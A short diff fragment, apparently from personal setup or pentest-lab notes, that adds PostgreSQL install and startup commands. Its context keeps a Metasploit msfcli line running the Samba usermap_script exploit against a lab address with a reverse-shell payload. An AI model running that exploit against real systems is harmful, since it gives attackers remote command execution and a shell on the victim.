@@ -15,3 +15,9 @@ run"
 
 
 msfcli exploit/multi/samba/usermap_script RHOST=172.16.194.172 PAYLOAD=cmd/unix/reverse LHOST=172.16.194.163 E
+
+## postsql y API REST
+
+sudo apt update && sudo apt-get install -y postgresql postgresql-client
+
+sudo service postgresql start && sudo update-rc.d postgresql enable
